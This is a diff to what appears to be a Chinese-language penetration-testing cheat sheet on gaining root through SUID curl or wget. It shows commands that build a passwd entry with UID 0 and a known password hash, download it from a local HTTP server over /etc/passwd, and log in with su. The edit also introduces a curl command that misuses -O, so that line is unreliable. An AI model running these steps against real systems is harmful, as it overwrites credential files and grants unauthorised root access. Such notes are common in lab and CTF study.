@@ -1,6 +1,6 @@
-# curl 
+# curl/wget
 
-curl suid 提权思想：利用 s 权限下载远程文件覆盖目标靶机上的文件进行提权。
+curl/wget suid 提权思想：利用 s 权限下载远程文件覆盖目标靶机上的文件进行提权。
 
 先创建一个 passwd 文件，写入下面一行：
 ```
@@ -17,7 +17,8 @@ echo 'hacked:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passw
 如果 `curl` 具有 s 权限，可使用如下命令获取 root 权限：
 
 ```
-./curl http://127.0.0.1:8000/passwd -o /etc/passwd
+curl http://127.0.0.1:8000/passwd -O /etc/passwd
+wget http://127.0.0.1:8000/passwd -O /etc/passwd
 su hacked
 密码为 pass123
 ```
